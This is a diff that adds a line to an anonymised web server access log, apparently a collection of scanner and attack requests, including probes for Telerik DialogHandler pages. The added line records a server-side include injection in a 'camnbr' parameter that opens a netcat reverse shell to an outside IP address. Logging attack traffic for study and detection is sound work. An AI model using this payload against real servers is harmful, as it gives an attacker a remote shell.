@@ -2262,3 +2262,5 @@ Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /etrakit3/App_Master/Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 301 162 "-" "-" "-"
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /etrakit2/App_Master/Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 301 162 "-" "-" "-"
 Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /etrakit/App_Master/Telerik.Web.UI.DialogHandler.aspx HTTP/1.1" 404 524 "-" "-" "-"
+
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%2031.220.3.140%209772%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 301 162 "-" "-" "-"
